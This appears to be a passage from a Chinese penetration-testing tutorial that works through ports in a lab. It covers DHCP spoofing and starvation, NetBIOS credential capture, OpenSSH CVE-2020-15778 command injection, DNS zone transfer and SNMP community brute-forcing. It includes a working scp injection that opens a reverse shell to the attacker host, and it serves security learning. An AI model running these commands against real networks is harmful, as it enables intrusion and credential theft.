67/68端口

原理：开机时，主机会向DHCP服务器请求分配地址，这个时候，如果黑客提前把DHCP地址池的IP全部占完，并且伪装成一个新的DHCP服务器，那么主机就会向黑客的DHCP服务器请求地址，并返回一个虚假的IP和DNS地址，影响是：

  1. 你打开任何网站，都会解析到黑客的钓鱼页面

  2. 也可以嗅探到内网中明文传输的密码，例如FTP/Telnet


Kali安装DHCP服务

sudo apt install isc-dhcp-server

设置DHCP服务配置文件（去掉注释符）

sudo vim /etc/dhcp/dhcpd.conf


开启DHCP服务

dhcpd -cf /etc/dhcp/dhcpd.conf

把DHCP地址池占完

sudo yersinia -G


等个五分钟后，就可以关了，它本质就是DOS攻击，狂吃你CPU


进行嗅探（或者结合DNS欺骗，就是用ettercap，和上文【欺骗篇-53端口】一模一样，除了选择MITM的时候有区别，这时我们要选DHCP poisoning）

sudo ettercap -Tq -i eth0


137/138/139端口

NetBios欺骗，可以获取到对方电脑的凭证，当拿不下域控的时候可以考虑。原理：当内网主机通过SMB访问DNS中不存在的主机时，此时就会退回LLMNR和NetBIOS进行计算机名称解析。

资产清单192.168.206.140 Kali攻击机192.168.206.132 Win10受害机


通过Kali自带的response工具进行监听

最新的OpenSSH分别是CVE-2020-15778（命令注入）和CVE-2021-41617（提权）：

资产表192.168.206.139 Centos8 SSH服务器192.168.206.140 Kali 攻击机


在Kail上，先用MSF对SSH进行版本扫描，我们知道了版本是8.0

use auxiliary/scanner/ssh/ssh_version


发现在searchsploit找不到该版本相关漏洞，于是就去百度找最新的CVE，发现上面我们提及的两个漏洞

CVE-2020-15778影响范围： <= openssh-8.3p1CVE-2021-41617影响范围：OpenSSH版本6.2-8.7


第一个漏洞（CVE-2020-15778）是因为向远程主机拷贝文件时，用到了scp命令，而文件的路径会追加到scp命令后，scp命令没有检查过滤文件路径，导致可以插入反引号，使远程主机执行命令

（登不上SSH的时候可以用，但前提是得知道密码）


直接反弹SHELL

nc -lvvp 6666scp test.txt wislab@192.168.206.139:'`bash -i >& /dev/tcp/192.168.206.140/6666 0>&1`/tmp/test1.txt'


至于第二个漏洞（CVE-2021-41617）是因为/etc/ssh/sshd_config配置不当，开启了AuthorizedKeysCommand 或 AuthorizedPrincipalsCommand（默认是不开启的），导致了执行命令时用的是sshd服务运行者的权限。

（这里大家知道就好，国内外网站都没找到相关POC，没办法复现，估计是该CVE危害影响太大了）

0x09 信息搜集篇

53端口

DNS域传送：为了防止DNS主服务器出现不解析的情况，需要一台备用服务器来做备份，保持数据的同步，然而主服务器没有对请求数据的备用服务器进行访问控制，导致了域传送漏洞，影响是信息泄露，例如泄露子域名。


直接用电脑自带的nslookup命令，就可以验证漏洞是否存在

先查询该域名的NS记录

nslookup -type=ns baidu.com


再进入nslookup交互模式，验证漏洞

nslookupserver ns4.baidu.comls baidu.com


出现以上关键字，说明不存在域传送漏洞，若存在，则长下面这样


161/162端口

参考了freebuf，强烈建议看原文，怎么获取OID值https://www.freebuf.com/articles/network/319234.html

SNMP内网信息搜集，其是基于UDP的协议，nmap扫描记得加参数-sU，好像nmap默认只采用TCP协议扫描，这个服务的作用在于管理设备，监控它们的状态。其中，SNMP主要有三个版本，如下：

  • SNMP v1是SNMP协议的最初版本，不过依然是众多厂家实现SNMP的基本方式；

  • SNMP v2c通常被指是基于Community的SNMP v2c，而Community本质上就是密码；

  • SNMP v3是最新版本的SNMP，它对网络管理最大的贡献在于其安全性，增加了对认证和密文传输的支持。

一般可攻击的都是v1和v2c，


可以通过msf的snmp扫描器检测版本信息

use auxiliary/scanner/snmp/aix_version


Community默认团体名，相当于默认密码，如下：

可读写：private只读：public

可以用Kali自带的snmpwalk命令进行测试

snmpwalk -c public -v2c ip


密码错误会返回Timeout，密码正确会返回设备的OID，如上所示。

OID就是设备的节点号，查询的时候前面的iso可以不输入，也可以用1替代。


如果不是默认密码，我们可以通过kali自带的onesixtyone命令进行爆破

onesixtyone -c dict.txt ip -w 64


关于snmp工具介绍

  • snmpwalk：对OID值进行遍历

  • snmpget：获得具体的OID值


遍历该设备所有OID

snmpwalk -c private -v2c ip >>oid.txt


通过OID获取设备敏感信息（不同设备的OID是不同的）

snmpget -c private -v2c ip .1.3.6.1.2.1.1.5.0
